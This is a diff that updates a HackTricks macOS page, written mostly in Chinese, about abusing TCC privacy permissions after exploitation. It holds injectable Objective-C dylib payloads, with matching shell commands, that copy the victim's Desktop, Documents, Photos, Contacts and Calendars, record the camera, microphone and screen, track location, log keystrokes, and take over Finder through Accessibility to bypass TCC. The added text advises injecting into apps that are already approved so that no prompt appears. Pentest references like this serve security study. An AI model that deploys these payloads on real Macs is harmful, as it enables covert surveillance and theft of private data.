@@ -2,14 +2,22 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-### 桌面
+> [!TIP]
+> TCC 决策与请求资源的进程的**身份**绑定。在 post-exploitation 中，通常目标是将这些 payloads **注入到一个已经获批的 app** 中（或者以其 bundle / signature 上下文执行），而不是运行一个新的 helper 去触发自己的 prompt。
+>
+> 对于 **Screen Recording**、**Input Monitoring** 和 **synthetic input**，现代 macOS 也提供了明确的 preflight / request APIs，例如 `CGPreflightScreenCaptureAccess`、`CGRequestScreenCaptureAccess`、`CGRequestListenEventAccess` 和 `CGRequestPostEventAccess`。
 
-- **权限**: 无
+> [!WARNING]
+> 这仍然是一条非常现实的攻击路径：最近针对 Microsoft macOS apps 的 permission-theft research 显示，**weak library validation / plugin loading** 可能让攻击者在不再次提示的情况下，复用受害者 app 已经授予的 **camera**、**microphone** 和其他 TCC 权限。
+
+### Desktop
+
+- **Entitlement**: None
 - **TCC**: kTCCServiceSystemPolicyDesktopFolder
 
 {{#tabs}}
 {{#tab name="ObjetiveC"}}
-将 `$HOME/Desktop` 复制到 `/tmp/desktop`。
+Copy `$HOME/Desktop` to `/tmp/desktop`.
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -51,9 +59,9 @@ cp -r "$HOME/Desktop" "/tmp/desktop"
 {{#endtab}}
 {{#endtabs}}
 
-### 文档
+### Documents
 
-- **权限**: 无
+- **Entitlement**: None
 - **TCC**: `kTCCServiceSystemPolicyDocumentsFolder`
 
 {{#tabs}}
@@ -102,7 +110,7 @@ cp -r "$HOME/Documents" "/tmp/documents"
 
 ### 下载
 
-- **权限**: 无
+- **Entitlement**: None
 - **TCC**: `kTCCServiceSystemPolicyDownloadsFolder`
 
 {{#tabs}}
@@ -151,12 +159,12 @@ cp -r "$HOME/Downloads" "/tmp/downloads"
 
 ### 照片库
 
-- **权限**: `com.apple.security.personal-information.photos-library`
+- **Entitlement**: `com.apple.security.personal-information.photos-library`
 - **TCC**: `kTCCServicePhotos`
 
 {{#tabs}}
 {{#tab name="ObjetiveC"}}
-复制 `$HOME/Pictures/Photos Library.photoslibrary` 到 `/tmp/photos`。
+将 `$HOME/Pictures/Photos Library.photoslibrary` 复制到 `/tmp/photos`。
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -200,12 +208,12 @@ cp -r "$HOME/Pictures/Photos Library.photoslibrary" "/tmp/photos"
 
 ### 联系人
 
-- **权限**: `com.apple.security.personal-information.addressbook`
+- **Entitlement**: `com.apple.security.personal-information.addressbook`
 - **TCC**: `kTCCServiceAddressBook`
 
 {{#tabs}}
 {{#tab name="ObjetiveC"}}
-将 `$HOME/Library/Application Support/AddressBook` 复制到 `/tmp/contacts`。
+将`$HOME/Library/Application Support/AddressBook`复制到`/tmp/contacts`。
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -249,12 +257,12 @@ cp -r "$HOME/Library/Application Support/AddressBook" "/tmp/contacts"
 
 ### 日历
 
-- **权限**: `com.apple.security.personal-information.calendars`
+- **Entitlement**: `com.apple.security.personal-information.calendars`
 - **TCC**: `kTCCServiceCalendar`
 
 {{#tabs}}
 {{#tab name="ObjectiveC"}}
-复制 `$HOME/Library/Calendars` 到 `/tmp/calendars`。
+将 `$HOME/Library/Calendars` 复制到 `/tmp/calendars`。
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -298,12 +306,12 @@ cp -r "$HOME/Library/Calendars" "/tmp/calendars"
 
 ### 摄像头
 
-- **权限**: `com.apple.security.device.camera`
+- **Entitlement**: `com.apple.security.device.camera`
 - **TCC**: `kTCCServiceCamera`
 
 {{#tabs}}
-{{#tab name="ObjetiveC - 录制"}}
-录制一个3秒的视频并将其保存在 **`/tmp/recording.mov`**
+{{#tab name="ObjetiveC - Record"}}
+录制一段 3 秒的视频并将其保存到 **`/tmp/recording.mov`**
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -382,7 +390,7 @@ fclose(stderr); // Close the file stream
 {{#endtab}}
 
 {{#tab name="ObjectiveC - Check"}}
-检查程序是否有访问相机的权限。
+检查程序是否有摄像头访问权限。
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -415,7 +423,7 @@ fclose(stderr); // Close the file stream
 {{#endtab}}
 
 {{#tab name="Shell"}}
-用相机拍照
+使用摄像头拍照
 ```bash
 ffmpeg -framerate 30 -f avfoundation -i "0" -frames:v 1 /tmp/capture.jpg
 ```
@@ -424,12 +432,12 @@ ffmpeg -framerate 30 -f avfoundation -i "0" -frames:v 1 /tmp/capture.jpg
 
 ### 麦克风
 
-- **权限**: **com.apple.security.device.audio-input**
+- **Entitlement**: **com.apple.security.device.audio-input**
 - **TCC**: `kTCCServiceMicrophone`
 
 {{#tabs}}
-{{#tab name="ObjetiveC - 录音"}}
-录制 5 秒音频并将其存储在 `/tmp/recording.m4a`
+{{#tab name="ObjetiveC - Record"}}
+录制 5 秒音频并将其存储到 `/tmp/recording.m4a`
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -529,7 +537,7 @@ fclose(stderr); // Close the file stream
 {{#endtab}}
 
 {{#tab name="ObjectiveC - Check"}}
-检查应用是否有权访问麦克风。
+检查应用是否有麦克风访问权限。
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -560,7 +568,7 @@ static void telegram(int argc, const char **argv) {
 {{#endtab}}
 
 {{#tab name="Shell"}}
-录制5秒音频并将其存储在`/tmp/recording.wav`
+录制 5s 音频并将其保存到 `/tmp/recording.wav`
 ```bash
 # Check the microphones
 ffmpeg -f avfoundation -list_devices true -i ""
@@ -570,13 +578,13 @@ ffmpeg -f avfoundation -i ":1" -t 5 /tmp/recording.wav
 {{#endtab}}
 {{#endtabs}}
 
-### 位置
+### Location
 
 > [!TIP]
-> 要让应用获取位置，**位置服务**（来自隐私与安全）**必须启用，** 否则将无法访问。
+> 为了让应用获取位置，**Location Services**（来自 Privacy & Security）**必须启用，**否则它将无法访问。
 
-- **权限**: `com.apple.security.personal-information.location`
-- **TCC**: 在 `/var/db/locationd/clients.plist` 中授予
+- **Entitlement**: `com.apple.security.personal-information.location`
+- **TCC**: 授予于 `/var/db/locationd/clients.plist`
 
 {{#tabs}}
 {{#tab name="ObjectiveC"}}
@@ -630,21 +638,29 @@ freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
 {{#endtab}}
 
 {{#tab name="Shell"}}
-获取对该位置的访问权限
+从 shell 获取当前位置。
+```bash
+# Fast option: use a dedicated CoreLocation CLI helper
+brew install --cask corelocationcli
+CoreLocationCLI --json
+
+# Keep printing updates while the device moves
+CoreLocationCLI --watch --format '%latitude %longitude %speed %time'
 ```
-???
-```
+> [!TIP]
+> 这仍然取决于 **Location Services** 已启用以及该工具 / 终端获得了 TCC 批准。`CoreLocationCLI` 在大多数 Mac 上也依赖于基于 Wi-Fi 的定位，因此禁用 Wi-Fi 往往会导致 `kCLErrorDomain error 0`。
+
 {{#endtab}}
 {{#endtabs}}
 
 ### 屏幕录制
 
-- **权限**: 无
+- **Entitlement**: None
 - **TCC**: `kTCCServiceScreenCapture`
 
 {{#tabs}}
 {{#tab name="ObjectiveC"}}
-在`/tmp/screen.mov`中录制主屏幕5秒
+将主屏幕录制 5 秒到 `/tmp/screen.mov`
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -672,6 +688,7 @@ exit(0);
 
 __attribute__((constructor))
 void myconstructor(int argc, const char **argv)
+{
 freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
 AVCaptureSession *captureSession = [[AVCaptureSession alloc] init];
 AVCaptureScreenInput *screenInput = [[AVCaptureScreenInput alloc] initWithDisplayID:CGMainDisplayID()];
@@ -700,23 +717,47 @@ freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
 ```
 {{#endtab}}
 
+{{#tab name="ObjectiveC - Check / Prompt"}}
+检查当前进程是否可以捕获屏幕，并在需要时触发 TCC 提示。
+```objectivec
+#import <Foundation/Foundation.h>
+#import <CoreGraphics/CoreGraphics.h>
+
+// clang -framework Foundation -framework CoreGraphics -dynamiclib ScreenCheck.m -o ScreenCheck.dylib
+
+__attribute__((constructor))
+static void screencheck(int argc, const char **argv) {
+freopen("/tmp/logs.txt", "a", stderr);
+BOOL allowed = CGPreflightScreenCaptureAccess();
+if (!allowed) {
+allowed = CGRequestScreenCaptureAccess();
+}
+NSLog(@"Screen capture access: %@", allowed ? @"granted" : @"denied");
+fclose(stderr);
+}
+```
+{{#endtab}}
+
 {{#tab name="Shell"}}
-记录主屏幕5秒钟
+录制主屏幕 5 秒
 ```bash
 screencapture -V 5 /tmp/screen.mov
 ```
 {{#endtab}}
 {{#endtabs}}
 
-### 可访问性
+> [!TIP]
+> 在 **macOS 12.3+** 上，`ScreenCaptureKit` 通常比 `AVCaptureScreenInput` 更适合作为 post-exploitation primitive：它可以进行高性能流式传输、用 `SCScreenshotManager` 抓取单帧，并且可以流式传输 **system audio**。如果你还想要 **microphone** 音频，仍然需要 `kTCCServiceMicrophone`。关于更多 desktop-session abuse primitives，见 [this related page](../macos-input-monitoring-screen-capture-accessibility.md)。
 
-- **权限**: 无
+### Accessibility
+
+- **Entitlement**: None
 - **TCC**: `kTCCServiceAccessibility`
 
-使用 TCC 权限接受 Finder 的控制，按下回车并以此绕过 TCC
+使用 TCC privilege 接管 Finder，按下 enter，然后以这种方式 bypass TCC
 
 {{#tabs}}
-{{#tab name="接受 TCC"}}
+{{#tab name="Accept TCC"}}
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <ApplicationServices/ApplicationServices.h>
@@ -770,7 +811,7 @@ return 0;
 {{#endtab}}
 
 {{#tab name="Keylogger"}}
-将按下的键存储在 **`/tmp/keystrokes.txt`**
+将按下的键存储到 **`/tmp/keystrokes.txt`**
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <ApplicationServices/ApplicationServices.h>
@@ -877,6 +918,17 @@ return 0;
 {{#endtab}}
 {{#endtabs}}
 
-> [!CAUTION] > **无障碍功能是一个非常强大的权限**，你可以以其他方式滥用它，例如你可以仅通过它执行**击键攻击**，而无需调用系统事件。
+> [!CAUTION] > **Accessibility 是一个非常强大的权限**，你可以以其他方式滥用它，例如你可以仅凭它执行 **keystrokes attack**，而不需要调用 System Events。
+
+> [!TIP]
+> 较新的 macOS 版本还会将 desktop-session abuse 拆分为 **Input Monitoring** (`kTCCServiceListenEvent`) 和 **synthetic input** (`kTCCServicePostEvent`)。如果你需要 keylogging、screen grabs，或原始事件注入，而不是 AXUIElement automation，请查看 [macOS Input Monitoring, Screen Capture & Accessibility Abuse](../macos-input-monitoring-screen-capture-accessibility.md)。
+
+
+
+## References
+
+- [Cisco Talos - How multiple vulnerabilities in Microsoft apps for macOS pave the way to stealing permissions](https://blog.talosintelligence.com/how-multiple-vulnerabilities-in-microsoft-apps-for-macos-pave-the-way-to-stealing-permissions/)
+- [CoreLocationCLI](https://github.com/fulldecent/corelocationcli)
+
 
 {{#include ../../../../banners/hacktricks-training.md}}
